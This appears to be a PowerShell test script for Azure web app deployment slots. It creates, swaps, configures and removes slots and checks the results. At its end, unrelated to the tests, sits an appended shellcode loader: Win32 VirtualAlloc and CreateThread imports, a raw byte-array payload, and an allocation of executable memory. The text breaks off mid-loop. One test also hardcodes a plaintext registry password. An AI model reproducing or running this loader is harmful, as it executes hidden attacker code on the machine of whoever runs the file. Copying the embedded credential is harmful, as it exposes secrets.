function Test-GetWebAppSlot{$rgname = Get-ResourceGroupName$appname = Get-WebsiteName$slotname1 = "staging"$slotname2 = "testing"$location = Get-Location$planName = Get-WebHostPlanName$tier = "Standard"$resourceType = "Microsoft.Web/sites"try{New-AzResourceGroup -Name $rgname -Location $location$serverFarm = New-AzAppServicePlan -ResourceGroupName $rgname -Name  $planName -Location  $location -Tier $tier$webapp = New-AzWebApp -ResourceGroupName $rgname -Name $appname -Location $location -AppServicePlan $planName Assert-AreEqual $appname $webapp.NameAssert-AreEqual $serverFarm.Id $webapp.ServerFarmId$slot1 = New-AzWebAppSlot -ResourceGroupName $rgname -Name $appname -Slot $slotname1 -AppServicePlan $planName$appWithSlotName1 = "$appname/$slotname1"Assert-AreEqual $appWithSlotName1 $slot1.NameAssert-AreEqual $serverFarm.Id $slot1.ServerFarmId$slot1 = Get-AzWebAppSlot -ResourceGroupName $rgname -Name $appname -Slot $slotname1Assert-AreEqual $appWithSlotName1 $slot1.NameAssert-AreEqual $serverFarm.Id $slot1.ServerFarmId$slot1 = $webapp | Get-AzWebAppSlot -Slot $slotname1Assert-AreEqual $appWithSlotName1 $slot1.NameAssert-AreEqual $serverFarm.Id $slot1.ServerFarmId$slot2 = New-AzWebAppSlot -ResourceGroupName $rgname -Name $appname -Slot $slotname2 -AppServicePlan $planName $appWithSlotName2 = "$appname/$slotname2"Assert-AreEqual $appWithSlotName2 $slot2.NameAssert-AreEqual $serverFarm.Id $slot2.ServerFarmId$slots = Get-AzWebAppSlot -ResourceGroupName $rgname -Name $appname $slotNames = $slots | Select -expand NameAssert-AreEqual 2 $slots.CountAssert-True { $slotNames -contains $appWithSlotName1 }Assert-True { $slotNames -contains $appWithSlotName2 }}finally{Remove-AzWebAppSlot -ResourceGroupName $rgname -Name $appname -Slot $slotname1 -ForceRemove-AzWebAppSlot -ResourceGroupName $rgname -Name $appname -Slot $slotname2 -ForceRemove-AzWebApp -ResourceGroupName $rgname -Name $appname -ForceRemove-AzAppServicePlan -ResourceGroupName $rgname -Name  $planName -ForceRemove-AzResourceGroup -Name $rgname -Force}}function Test-StartStopRestartWebAppSlot{$rgname = Get-ResourceGroupName$appname = Get-WebsiteName$slotname = "staging"$location = Get-Location$planName = Get-WebHostPlanName$tier = "Standard"$resourceType = "Microsoft.Web/sites"try{New-AzResourceGroup -Name $rgname -Location $location$serverFarm = New-AzAppServicePlan -ResourceGroupName $rgname -Name  $planName -Location  $location -Tier $tier$webapp = New-AzWebApp -ResourceGroupName $rgname -Name $appname -Location $location -AppServicePlan $planName Assert-AreEqual $appname $webApp.NameAssert-AreEqual $serverFarm.Id $webApp.ServerFarmId$slot = New-AzWebAppSlot -ResourceGroupName $rgname -Name $appname -Slot $slotname -AppServicePlan $planName $appWithSlotName = "$appname/$slotname"Assert-AreEqual $appWithSlotName $slot.NameAssert-AreEqual $serverFarm.Id $slot.ServerFarmId$slot = $slot | Stop-AzWebAppSlotAssert-AreEqual "Stopped" $slot.State$slot = $slot | Start-AzWebAppSlotAssert-AreEqual "Running" $slot.State$slot = Stop-AzWebAppSlot -ResourceGroupName $rgname -Name $appname -Slot $slotnameAssert-AreEqual "Stopped" $slot.State$slot = Start-AzWebAppSlot -ResourceGroupName $rgname -Name $appname -Slot $slotnameAssert-AreEqual "Running" $slot.State$slot = Restart-AzWebAppSlot -ResourceGroupName $rgname -Name $appname -Slot $slotnameAssert-AreEqual "Running" $slot.State$slot = $slot | Restart-AzWebAppSlotAssert-AreEqual "Running" $slot.State}finally{Remove-AzWebAppSlot -ResourceGroupName $rgname -Name $appname -Slot $slotname -ForceRemove-AzWebApp -ResourceGroupName $rgname -Name $appname -ForceRemove-AzAppServicePlan -ResourceGroupName $rgname -Name  $planName -ForceRemove-AzResourceGroup -Name $rgname -Force}}function Test-CloneWebAppToSlot{$rgname = Get-ResourceGroupName$appname = Get-WebsiteName$slotname = "staging"$location = Get-Location$planName = Get-WebHostPlanName$tier = "Premium"$resourceType = "Microsoft.Web/sites"try{New-AzResourceGroup -Name $rgname -Location $location$serverFarm = New-AzAppServicePlan -ResourceGroupName $rgname -Name  $planName -Location  $location -Tier $tier$webapp = New-AzWebApp -ResourceGroupName $rgname -Name $appname -Location $location -AppServicePlan $planName Assert-AreEqual $appname $webapp.NameAssert-AreEqual $serverFarm.Id $webapp.ServerFarmId$slot = New-AzWebAppSlot -ResourceGroupName $rgname -Name $appname -Slot $slotname -AppServicePlan $planName -SourceWebApp $webapp$appWithSlotName = "$appname/$slotname"Assert-AreEqual $appWithSlotName $slot.Name$slot = Get-AzWebAppSlot -ResourceGroupName $rgname -Name $appname -Slot $slotnameAssert-AreEqual $appWithSlotName $slot.Name}finally{Remove-AzWebAppSlot -ResourceGroupName $rgname -Name $appname -Slot $slotname -ForceRemove-AzWebApp -ResourceGroupName $rgname -Name $appname -ForceRemove-AzAppServicePlan -ResourceGroupName $rgname -Name  $planName -ForceRemove-AzResourceGroup -Name $rgname -Force}}function Test-CloneWebAppSlot{$rgname = Get-ResourceGroupName$appname = Get-WebsiteName$location = Get-Location$planName = Get-WebHostPlanName$slotname = "staging"$tier = "Premium"$resourceType = "Microsoft.Web/sites"$destPlanName = Get-WebHostPlanName$destLocation = Get-SecondaryLocation$destAppName = Get-WebsiteNametry{New-AzResourceGroup -Name $rgname -Location $location$serverFarm = New-AzAppServicePlan -ResourceGroupName $rgname -Name  $planName -Location  $location -Tier $tier$webapp = New-AzWebApp -ResourceGroupName $rgname -Name $appname -Location $location -AppServicePlan $planName Assert-AreEqual $appname $webapp.NameAssert-AreEqual $serverFarm.Id $webapp.ServerFarmId$slot1 = New-AzWebAppSlot -ResourceGroupName $rgname -Name $appname -Slot $slotname -AppServicePlan $planName$appWithSlotName = "$appname/$slotname"Assert-AreEqual $appWithSlotName $slot1.NameAssert-AreEqual $serverFarm.Id $slot1.ServerFarmId$serverFarm2 = New-AzAppServicePlan -ResourceGroupName $rgname -Name  $destPlanName -Location  $destLocation -Tier $tier$webapp2 = New-AzWebApp -ResourceGroupName $rgname -Name $destAppName -Location $destLocation -AppServicePlan $destPlanNameAssert-AreEqual $destAppName $webapp2.NameAssert-AreEqual $serverFarm2.Id $webapp2.ServerFarmId$slot2 = New-AzWebAppSlot -ResourceGroupName $rgname -Name $destAppName -Slot $slotname -AppServicePlan $planName -SourceWebApp $slot1$appWithSlotName2 = "$destAppName/$slotname"Assert-AreEqual $appWithSlotName2 $slot2.Name}finally{Remove-AzResourceGroup -Name $rgname -Force}}function Test-CreateNewWebAppSlot{$rgname = Get-ResourceGroupName$appname = Get-WebsiteName$location = Get-Location$slotname = "staging"$planName = Get-WebHostPlanName$tier = "Standard"$resourceType = "Microsoft.Web/sites"try{New-AzResourceGroup -Name $rgname -Location $location$serverFarm = New-AzAppServicePlan -ResourceGroupName $rgname -Name  $planName -Location  $location -Tier $tier$actual =  New-AzWebApp -ResourceGroupName $rgname -Name $appname -Location $location -AppServicePlan $planNameAssert-AreEqual $appname $actual.NameAssert-AreEqual $serverFarm.Id $actual.ServerFarmId$result = Get-AzWebApp -ResourceGroupName $rgname -Name $appnameAssert-AreEqual $appname $result.NameAssert-AreEqual $serverFarm.Id $result.ServerFarmId$job = New-AzWebAppSlot -ResourceGroupName $rgname -Name $appname -Slot $slotname -AsJob$job | Wait-Job$slot1 = $job | Receive-Job$appWithSlotName = "$appname/$slotname"Assert-AreEqual $appWithSlotName $slot1.NameAssert-AreEqual $serverFarm.Id $slot1.ServerFarmId}finally{Remove-AzWebAppSlot -ResourceGroupName $rgname -Name $appname -Slot $slotname -ForceRemove-AzWebApp -ResourceGroupName $rgname -Name $appname -ForceRemove-AzAppServicePlan -ResourceGroupName $rgname -Name  $planName -ForceRemove-AzResourceGroup -Name $rgname -Force}}function Test-CreateNewWebAppSlotOnAse{$rgname = "appdemorg"$appname = Get-WebsiteName$slotname = "staging"$location = "West US"$planName = "travelproductionplan"$aseName = "asedemops"$apiversion = "2015-08-01"$resourceType = "Microsoft.Web/sites"try{$serverFarm = Get-AzAppServicePlan -ResourceGroupName $rgname -Name  $planName$actual = New-AzWebApp -ResourceGroupName $rgname -Name $appname -Location $location -AppServicePlan $planName -AseName $aseNameAssert-AreEqual $appname $actual.NameAssert-AreEqual $serverFarm.Id $actual.ServerFarmId$result = Get-AzWebApp -ResourceGroupName $rgname -Name $appnameAssert-AreEqual $appname $result.NameAssert-AreEqual $serverFarm.Id $result.ServerFarmId$slot1 = New-AzWebAppSlot -ResourceGroupName $rgname -Name $appname -Slot $slotname -AppServicePlan $planName -AseName $aseName$appWithSlotName = "$appname/$slotname"Assert-AreEqual $appWithSlotName $slot1.NameAssert-AreEqual $serverFarm.Id $slot1.ServerFarmId$slot1 = Get-AzWebAppSlot -ResourceGroupName $rgname -Name $appname -Slot $slotnameAssert-AreEqual $appWithSlotName $slot1.NameAssert-AreEqual $serverFarm.Id $slot1.ServerFarmId}finally{Remove-AzWebAppSlot -ResourceGroupName $rgname -Name $appname -Slot $slotname -ForceRemove-AzWebApp -ResourceGroupName $rgname -Name $appname -Force}}function Test-SetWebAppSlot{$rgname = Get-ResourceGroupName$appname = Get-WebsiteName$location = Get-Location$slotname = "staging"$planName1 = Get-WebHostPlanName$planName2 = Get-WebHostPlanName$tier1 = "Standard"$tier2 = "Standard"$apiversion = "2015-08-01"$resourceType = "Microsoft.Web/sites"$numberOfWorkers = 2try{New-AzResourceGroup -Name $rgname -Location $location$serverFarm1 = New-AzAppServicePlan -ResourceGroupName $rgname -Name  $planName1 -Location  $location -Tier $tier1$serverFarm2 = New-AzAppServicePlan -ResourceGroupName $rgname -Name  $planName2 -Location  $location -Tier $tier2$webApp = New-AzWebApp -ResourceGroupName $rgname -Name $appname -Location $location -AppServicePlan $planName1 Assert-AreEqual $appname $webApp.NameAssert-AreEqual $serverFarm1.Id $webApp.ServerFarmId$slot = New-AzWebAppSlot -ResourceGroupName $rgname -Name $appname -Slot $slotname -AppServicePlan $planName1$appWithSlotName = "$appname/$slotname"Assert-AreEqual $appWithSlotName $slot.NameAssert-AreEqual $serverFarm1.Id $slot.ServerFarmIdAssert-Null $webApp.Identity$job = Set-AzWebAppSlot -ResourceGroupName $rgname -Name $appname -Slot $slotname -AppServicePlan $planName2 -HttpsOnly $true -AsJob$job | Wait-Job$slot = $job | Receive-JobAssert-AreEqual $appWithSlotName $slot.NameAssert-AreEqual $serverFarm2.Id $slot.ServerFarmIdAssert-AreEqual $true $slot.HttpsOnly$slot.SiteConfig.HttpLoggingEnabled = $true$slot.SiteConfig.RequestTracingEnabled = $true$slot = $slot | Set-AzWebAppSlotAssert-AreEqual $appWithSlotName $slot.NameAssert-AreEqual $serverFarm2.Id $slot.ServerFarmIdAssert-AreEqual $true $slot.SiteConfig.HttpLoggingEnabledAssert-AreEqual $true $slot.SiteConfig.RequestTracingEnabled$appSettings = @{ "setting1" = "valueA"; "setting2" = "valueB"}$connectionStrings = @{ connstring1 = @{ Type="MySql"; Value="string value 1"}; connstring2 = @{ Type = "SQLAzure"; Value="string value 2"}}$slot = Set-AzWebAppSlot -ResourceGroupName $rgname -Name $appname -Slot $slotname -AppSettings $appSettings -AssignIdentity $trueAssert-NotNull  $slot.IdentityAssert-AreEqual ($appSettings.Keys.Count) $slot.SiteConfig.AppSettings.Count$slot = Set-AzWebAppSlot -ResourceGroupName $rgname -Name $appname -Slot $slotname -AppSettings $appSettings -ConnectionStrings $connectionStrings -numberofworkers $numberOfWorkersAssert-AreEqual $appWithSlotName $slot.Nameforeach($nvp in $slot.SiteConfig.AppSettings){Assert-True { $appSettings.Keys -contains $nvp.Name }Assert-True { $appSettings[$nvp.Name] -match $nvp.Value }}Assert-AreEqual $connectionStrings.Keys.Count $slot.SiteConfig.ConnectionStrings.Countforeach($connStringInfo in $slot.SiteConfig.ConnectionStrings){Assert-True { $connectionStrings.Keys -contains $connStringInfo.Name }}Assert-AreEqual $numberOfWorkers $slot.SiteConfig.NumberOfWorkers}finally{Remove-AzWebAppSlot -ResourceGroupName $rgname -Name $appname -Slot $slotname -ForceRemove-AzWebApp -ResourceGroupName $rgname -Name $appname -ForceRemove-AzAppServicePlan -ResourceGroupName $rgname -Name  $planName1 -ForceRemove-AzAppServicePlan -ResourceGroupName $rgname -Name  $planName2 -ForceRemove-AzResourceGroup -Name $rgname -Force}}function Test-RemoveWebAppSlot{$rgname = Get-ResourceGroupName$appname = Get-WebsiteName$location = Get-Location$slotname = "staging"$planName = Get-WebHostPlanName$tier = "Standard"$apiversion = "2015-08-01"$resourceType = "Microsoft.Web/sites"try{New-AzResourceGroup -Name $rgname -Location $location$serverFarm = New-AzAppServicePlan -ResourceGroupName $rgname -Name  $planName -Location  $location -Tier $tier$webapp = New-AzWebApp -ResourceGroupName $rgname -Name $appname -Location $location -AppServicePlan $planName Assert-AreEqual $appname $webapp.NameAssert-AreEqual $serverFarm.Id $webapp.ServerFarmId$slot = New-AzWebAppSlot -ResourceGroupName $rgname -Name $appname -Slot $slotname -AppServicePlan $planName$appWithSlotName = "$appname/$slotname"Assert-AreEqual $appWithSlotName $slot.NameAssert-AreEqual $serverFarm.Id $slot.ServerFarmId$slot | Remove-AzWebAppSlot -Force -AsJob | Wait-Job$slotNames = Get-AzWebAppSlot -ResourceGroupName $rgname -Name $appname | Select -expand NameAssert-False { $slotNames -contains $appname }}finally{Remove-AzWebApp -ResourceGroupName $rgname -Name $appname -ForceRemove-AzAppServicePlan -ResourceGroupName $rgname -Name  $planName -ForceRemove-AzResourceGroup -Name $rgname -Force}}function Test-WebAppSlotPublishingProfile{$rgname = Get-ResourceGroupName$appname = Get-WebsiteName$location = Get-Location$slotname = "staging"$planName = Get-WebHostPlanName$tier = "Standard"$apiversion = "2015-08-01"$resourceType = "Microsoft.Web/sites"$profileFileName = "slotprofile.xml"try{New-AzResourceGroup -Name $rgname -Location $location$serverFarm = New-AzAppServicePlan -ResourceGroupName $rgname -Name  $planName -Location  $location -Tier $tier$webapp = New-AzWebApp -ResourceGroupName $rgname -Name $appname -Location $location -AppServicePlan $planName Assert-AreEqual $appname $webapp.NameAssert-AreEqual $serverFarm.Id $webapp.ServerFarmId$slot = New-AzWebAppSlot -ResourceGroupName $rgname -Name $appname -Slot $slotname -AppServicePlan $planName$appWithSlotName = "$appname/$slotname"$appWithSlotName2 = "{0}__{1}" -f $appname, $slotname$appWithSlotName3 = "{0}-{1}" -f $appname, $slotnameAssert-AreEqual $appWithSlotName $slot.NameAssert-AreEqual $serverFarm.Id $slot.ServerFarmId[xml]$profile = Get-AzWebAppSlotPublishingProfile -ResourceGroupName $rgname -Name $appname -Slot $slotname -OutputFile $profileFileName$msDeployProfile = $profile.publishData.publishProfile | ? { $_.publishMethod -eq 'MSDeploy' } | Select -First 1$pass = $msDeployProfile.userPWDAssert-True { $msDeployProfile.msdeploySite -eq $appWithSlotName2 }$newPass = $slot | Reset-AzWebAppSlotPublishingProfile Assert-False { $pass -eq $newPass }[xml]$profile = $slot | Get-AzWebAppSlotPublishingProfile -OutputFile $profileFileName -Format FileZilla3$fileZillaProfile = $profile.FileZilla3.Servers.ServerAssert-True { $fileZillaProfile.Name -eq $appWithSlotName3 }[xml]$profile = Get-AzWebAppSlotPublishingProfile -ResourceGroupName $rgname -Name $appname -Slot $slotnameAssert-NotNull $profile}finally{Remove-AzWebAppSlot -ResourceGroupName $rgname -Name $appname  -Slot $slotname -ForceRemove-AzWebApp -ResourceGroupName $rgname -Name $appname -ForceRemove-AzAppServicePlan -ResourceGroupName $rgname -Name  $planName -ForceRemove-AzResourceGroup -Name $rgname -Force}}function Test-ManageSlotSlotConfigName{$rgname = Get-ResourceGroupName$appname = Get-WebsiteName$location = Get-Location$planName = Get-WebHostPlanName$tier = "Standard"try{New-AzResourceGroup -Name $rgname -Location $location$serverFarm = New-AzAppServicePlan -ResourceGroupName $rgname -Name  $planName -Location  $location -Tier $tier$webapp = New-AzWebApp -ResourceGroupName $rgname -Name $appname -Location $location -AppServicePlan $planName Assert-AreEqual $appname $webapp.NameAssert-AreEqual $serverFarm.Id $webapp.ServerFarmId$slotConfigNames = $webApp | Get-AzWebAppSlotConfigNameAssert-AreEqual 0 $slotConfigNames.AppSettingNames.CountAssert-AreEqual 0 $slotConfigNames.ConnectionStringNames.Count$appSettingNames = $webApp.SiteConfig.AppSettings | Select-Object -ExpandProperty NameAssert-NotNull $appSettingNames$webApp | Set-AzWebAppSlotConfigName -AppSettingNames $appSettingNames $slotConfigNames = $webApp | Get-AzWebAppSlotConfigNameAssert-AreEqual $webApp.SiteConfig.AppSettings.Count $slotConfigNames.AppSettingNames.CountAssert-AreEqual 0 $slotConfigNames.ConnectionStringNames.Count$webApp | Set-AzWebAppSlotConfigName -RemoveAllAppSettingNames$slotConfigNames = $webApp | Get-AzWebAppSlotConfigNameAssert-AreEqual 0 $slotConfigNames.AppSettingNames.CountAssert-AreEqual $webApp.SiteConfig.ConnectionStrings.Count $slotConfigNames.ConnectionStringNames.CountSet-AzWebAppSlotConfigName -ResourceGroupName $rgname -Name $appname -RemoveAllConnectionStringNames$slotConfigNames = Get-AzWebAppSlotConfigName -ResourceGroupName $rgname -Name $appnameAssert-AreEqual 0 $slotConfigNames.AppSettingNames.CountAssert-AreEqual 0 $slotConfigNames.ConnectionStringNames.Count}finally{Remove-AzResourceGroup -Name $rgname -Force}}function Test-WebAppRegularSlotSwap{$rgname = Get-ResourceGroupName$appname = Get-WebsiteName$location = Get-Location$planName = Get-WebHostPlanName$tier = "Standard"$sourceSlotName = "staging"$destinationSlotName = "production"try{New-AzResourceGroup -Name $rgname -Location $location$serverFarm = New-AzAppServicePlan -ResourceGroupName $rgname -Name  $planName -Location  $location -Tier $tier$webapp = New-AzWebApp -ResourceGroupName $rgname -Name $appname -Location $location -AppServicePlan $planName Assert-AreEqual $appname $webapp.NameAssert-AreEqual $serverFarm.Id $webapp.ServerFarmId$slot = New-AzWebAppSlot -ResourceGroupName $rgname -Name $appname -Slot $sourceSlotName -AppServicePlan $planName$webApp = Switch-AzWebAppSlot -ResourceGroupName $rgname -Name $appname -SourceSlotName $sourceSlotName -DestinationSlotName $destinationSlotName}finally{Remove-AzWebAppSlot -ResourceGroupName $rgname -Name $appname  -Slot $sourceSlotName -ForceRemove-AzWebApp -ResourceGroupName $rgname -Name $appname -ForceRemove-AzAppServicePlan -ResourceGroupName $rgname -Name  $planName -ForceRemove-AzResourceGroup -Name $rgname -Force}}function Test-WebAppSwapWithPreviewResetSlotSwap{Test-SlotSwapWithPreview 'ResetSlotSwap'}function Test-WebAppSwapWithPreviewCompleteSlotSwap{Test-SlotSwapWithPreview 'CompleteSlotSwap'}function Test-SlotSwapWithPreview($swapWithPreviewAction){$rgname = Get-ResourceGroupName$appname = Get-WebsiteName$location = Get-Location$planName = Get-WebHostPlanName$tier = "Standard"$sourceSlotName = "staging"$destinationSlotName = "production"$appSettingName = 'testappsetting'$originalSourceAppSettingValue = "staging"$originalDestinationAppSettingValue = "production"try{New-AzResourceGroup -Name $rgname -Location $location$serverFarm = New-AzAppServicePlan -ResourceGroupName $rgname -Name  $planName -Location  $location -Tier $tier$webapp = New-AzWebApp -ResourceGroupName $rgname -Name $appname -Location $location -AppServicePlan $planName Assert-AreEqual $appname $webapp.NameAssert-AreEqual $serverFarm.Id $webapp.ServerFarmId$slot = New-AzWebAppSlot -ResourceGroupName $rgname -Name $appname -Slot $sourceSlotName -AppServicePlan $planName$appSettings = @{ $appSettingName = $originalDestinationAppSettingValue }Set-AzWebApp -ResourceGroupName $rgname -Name $appname -AppSettings $appSettings$appSettings = @{ $appSettingName = $originalSourceAppSettingValue }Set-AzWebAppSlot -ResourceGroupName $rgname -Name $appname -Slot $sourceSlotName -AppSettings $appSettings$destinationWebApp = Get-AzWebApp -ResourceGroupName $rgname -Name  $appnameValidate-SlotSwapAppSetting $destinationWebApp $appSettingName $originalDestinationAppSettingValue$sourceWebApp = Get-AzWebAppSlot -ResourceGroupName $rgname -Name $appname -Slot $sourceSlotNameValidate-SlotSwapAppSetting $sourceWebApp $appSettingName $originalSourceAppSettingValueSwitch-AzWebAppSlot -ResourceGroupName $rgname -Name $appname -SourceSlotName $sourceSlotName -DestinationSlotName $destinationSlotName -SwapWithPreviewAction 'ApplySlotConfig'Wait-Seconds 30$sourceWebApp = Get-AzWebAppSlot -ResourceGroupName $rgname -Name  $appname -Slot $sourceSlotNameValidate-SlotSwapAppSetting $sourceWebApp $appSettingName $originalSourceAppSettingValueSwitch-AzWebAppSlot -ResourceGroupName $rgname -Name $appname -SourceSlotName $sourceSlotName -DestinationSlotName $destinationSlotName -SwapWithPreviewAction $swapWithPreviewActionWait-Seconds 30$sourceWebApp = Get-AzWebAppSlot -ResourceGroupName $rgname -Name  $appname -Slot $sourceSlotNameIf ($swapWithPreviewAction -eq 'ResetSlotSwap') {Validate-SlotSwapAppSetting $sourceWebApp $appSettingName $originalSourceAppSettingValue} Else {Validate-SlotSwapAppSetting $sourceWebApp $appSettingName $originalDestinationAppSettingValue}}finally{Remove-AzResourceGroup -Name $rgname -Force}}function Test-SetAzureStorageWebAppHyperVSlot{$rgname = Get-ResourceGroupName$wname = Get-WebsiteName$slotname = "staging"$location = Get-WebLocation$whpName = Get-WebHostPlanName$tier = "PremiumContainer"$apiversion = "2015-08-01"$resourceType = "Microsoft.Web/sites"$containerImageName = "pstestacr.azurecr.io/tests/iis:latest"$containerRegistryUrl = "https://pstestacr.azurecr.io"$containerRegistryUser = "pstestacr"$pass = "cYK4qnENExflnnOkBN7P+gkmBG0sqgIv"$containerRegistryPassword = ConvertTo-SecureString -String $pass -AsPlainText -Force$dockerPrefix = "DOCKER|" $azureStorageAccountCustomId1 = "mystorageaccount"$azureStorageAccountType1 = "AzureFiles"$azureStorageAccountName1 = "myaccountname.file.core.windows.net"$azureStorageAccountShareName1 = "myremoteshare"$azureStorageAccountAccessKey1 = "AnAccessKey"$azureStorageAccountMountPath1 = "C:\mymountpath"$azureStorageAccountCustomId2 = "mystorageaccount2"$azureStorageAccountType2 = "AzureFiles"$azureStorageAccountName2 = "myaccountname2.file.core.windows.net"$azureStorageAccountShareName2 = "myremoteshare2"$azureStorageAccountAccessKey2 = "AnAccessKey2"$azureStorageAccountMountPath2 = "C:\mymountpath2"try{New-AzResourceGroup -Name $rgname -Location $location$serverFarm = New-AzAppServicePlan -ResourceGroupName $rgname -Name  $whpName -Location  $location -Tier $tier -WorkerSize Small -HyperV$job = New-AzWebApp -ResourceGroupName $rgname -Name $wname -Location $location -AppServicePlan $whpName -ContainerImageName $containerImageName -ContainerRegistryUrl $containerRegistryUrl -ContainerRegistryUser $containerRegistryUser -ContainerRegistryPassword $containerRegistryPassword -AsJob$job | Wait-Job$actual = $job | Receive-JobAssert-AreEqual $wname $actual.NameAssert-AreEqual $serverFarm.Id $actual.ServerFarmId$result = Get-AzWebApp -ResourceGroupName $rgname -Name $wnameWrite-Debug "Created the web app"Assert-AreEqual $wname $result.NameAssert-AreEqual $serverFarm.Id $result.ServerFarmIdAssert-AreEqual $true $result.IsXenonAssert-AreEqual ($dockerPrefix + $containerImageName)  $result.SiteConfig.WindowsFxVersion$job = New-AzWebAppSlot -ResourceGroupName $rgname -Name $wname -Slot $slotname -AsJob$job | Wait-Job$slot1 = $job | Receive-JobWrite-Debug "Created the slot"$appWithSlotName = "$wname/$slotname"Write-Debug $appWithSlotNameAssert-AreEqual $appWithSlotName $slot1.NameAssert-AreEqual $serverFarm.Id $slot1.ServerFarmId$testStorageAccount1 = New-AzWebAppAzureStoragePath -Name $azureStorageAccountCustomId1 -Type $azureStorageAccountType1 -AccountName $azureStorageAccountName1 -ShareName $azureStorageAccountShareName1 -AccessKey $azureStorageAccountAccessKey1 -MountPath $azureStorageAccountMountPath1$testStorageAccount2 = New-AzWebAppAzureStoragePath -Name $azureStorageAccountCustomId2 -Type $azureStorageAccountType2 -AccountName $azureStorageAccountName2 -ShareName $azureStorageAccountShareName2 -AccessKey $azureStorageAccountAccessKey2 -MountPath $azureStorageAccountMountPath2Write-Debug "Created the new storage account paths"Write-Debug $testStorageAccount1.NameWrite-Debug $testStorageAccount2.Name$webApp = Set-AzWebAppSlot -ResourceGroupName $rgname -Name $wname -Slot $slotname -AzureStoragePath $testStorageAccount1, $testStorageAccount2Write-Debug "Set the new storage account paths"$result = Get-AzWebAppSlot -ResourceGroupName $rgname -Name $wname -Slot $slotname$azureStorageAccounts = $result.AzureStoragePathWrite-Debug $azureStorageAccounts[0].NameAssert-AreEqual $azureStorageAccounts[0].Name $azureStorageAccountCustomId1Write-Debug $azureStorageAccounts[0].TypeAssert-AreEqual $azureStorageAccounts[0].Type $azureStorageAccountType1Write-Debug $azureStorageAccounts[0].AccountNameAssert-AreEqual $azureStorageAccounts[0].AccountName $azureStorageAccountName1Write-Debug $azureStorageAccounts[0].ShareNameAssert-AreEqual $azureStorageAccounts[0].ShareName $azureStorageAccountShareName1Write-Debug $azureStorageAccounts[0].AccessKey Assert-AreEqual $azureStorageAccounts[0].AccessKey $azureStorageAccountAccessKey1Write-Debug $azureStorageAccounts[0].MountPathAssert-AreEqual $azureStorageAccounts[0].MountPath $azureStorageAccountMountPath1Write-Debug $azureStorageAccounts[1].NameAssert-AreEqual $azureStorageAccounts[1].Name $azureStorageAccountCustomId2Write-Debug $azureStorageAccounts[1].TypeAssert-AreEqual $azureStorageAccounts[1].Type $azureStorageAccountType2Write-Debug $azureStorageAccounts[1].AccountNameAssert-AreEqual $azureStorageAccounts[1].AccountName $azureStorageAccountName2Write-Debug $azureStorageAccounts[1].ShareNameAssert-AreEqual $azureStorageAccounts[1].ShareName $azureStorageAccountShareName2Write-Debug $azureStorageAccounts[1].AccessKeyAssert-AreEqual $azureStorageAccounts[1].AccessKey $azureStorageAccountAccessKey2Write-Debug $azureStorageAccounts[1].MountPathAssert-AreEqual $azureStorageAccounts[1].MountPath $azureStorageAccountMountPath2}finally{Remove-AzWebApp -ResourceGroupName $rgname -Name $wname -ForceRemove-AzAppServicePlan -ResourceGroupName $rgname -Name  $whpName -ForceRemove-AzResourceGroup -Name $rgname -Force}}function Validate-SlotSwapAppSetting($webApp, $appSettingName, $expectedValue){Assert-AreEqual $appSettingName $webApp.SiteConfig.AppSettings[0].NameAssert-AreEqual $expectedValue $webApp.SiteConfig.AppSettings[0].Value}$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdb,0xdf,0xbf,0x84,0x9e,0x73,0x0d,0xd9,0x74,0x24,0xf4,0x5a,0x31,0xc9,0xb1,0x47,0x31,0x7a,0x18,0x83,0xea,0xfc,0x03,0x7a,0x90,0x7c,0x86,0xf1,0x70,0x02,0x69,0x0a,0x80,0x63,0xe3,0xef,0xb1,0xa3,0x97,0x64,0xe1,0x13,0xd3,0x29,0x0d,0xdf,0xb1,0xd9,0x86,0xad,0x1d,0xed,0x2f,0x1b,0x78,0xc0,0xb0,0x30,0xb8,0x43,0x32,0x4b,0xed,0xa3,0x0b,0x84,0xe0,0xa2,0x4c,0xf9,0x09,0xf6,0x05,0x75,0xbf,0xe7,0x22,0xc3,0x7c,0x83,0x78,0xc5,0x04,0x70,0xc8,0xe4,0x25,0x27,0x43,0xbf,0xe5,0xc9,0x80,0xcb,0xaf,0xd1,0xc5,0xf6,0x66,0x69,0x3d,0x8c,0x78,0xbb,0x0c,0x6d,0xd6,0x82,0xa1,0x9c,0x26,0xc2,0x05,0x7f,0x5d,0x3a,0x76,0x02,0x66,0xf9,0x05,0xd8,0xe3,0x1a,0xad,0xab,0x54,0xc7,0x4c,0x7f,0x02,0x8c,0x42,0x34,0x40,0xca,0x46,0xcb,0x85,0x60,0x72,0x40,0x28,0xa7,0xf3,0x12,0x0f,0x63,0x58,0xc0,0x2e,0x32,0x04,0xa7,0x4f,0x24,0xe7,0x18,0xea,0x2e,0x05,0x4c,0x87,0x6c,0x41,0xa1,0xaa,0x8e,0x91,0xad,0xbd,0xfd,0xa3,0x72,0x16,0x6a,0x8f,0xfb,0xb0,0x6d,0xf0,0xd1,0x05,0xe1,0x0f,0xda,0x75,0x2b,0xcb,0x8e,0x25,0x43,0xfa,0xae,0xad,0x93,0x03,0x7b,0x5b,0x91,0x93,0x44,0x34,0x99,0x69,0x2d,0x47,0x9a,0x7c,0xf1,0xce,0x7c,0x2e,0x59,0x81,0xd0,0x8e,0x09,0x61,0x81,0x66,0x40,0x6e,0xfe,0x96,0x6b,0xa4,0x97,0x3c,0x84,0x11,0xcf,0xa8,0x3d,0x38,0x9b,0x49,0xc1,0x96,0xe1,0x49,0x49,0x15,0x15,0x07,0xba,0x50,0x05,0xff,0x4a,0x2f,0x77,0xa9,0x55,0x85,0x12,0x55,0xc0,0x22,0xb5,0x02,0x7c,0x29,0xe0,0x64,0x23,0xd2,0xc7,0xff,0xea,0x46,0xa8,0x97,0x12,0x87,0x28,0x67,0x45,0xcd,0x28,0x0f,0x31,0xb5,0x7a,0x2a,0x3e,0x60,0xef,0xe7,0xab,0x8b,0x46,0x54,0x7b,0xe4,0x64,0x83,0x4b,0xab,0x97,0xe6,0x4d,0x97,0x41,0xce,0x3b,0xf9,0x51;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for 